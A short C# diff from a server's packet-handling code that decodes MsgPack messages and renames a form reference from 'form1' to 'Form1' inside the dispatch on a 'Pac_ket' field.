@@ -18,7 +18,7 @@ namespace Server.Handle_Packet
             {
                 var unpack_msgpack = new MsgPack();
                 unpack_msgpack.DecodeFromBytes(data);
-                Program.form1.Invoke((MethodInvoker)(() =>
+                Program.Form1.Invoke((MethodInvoker)(() =>
                 {
                     switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
                     {
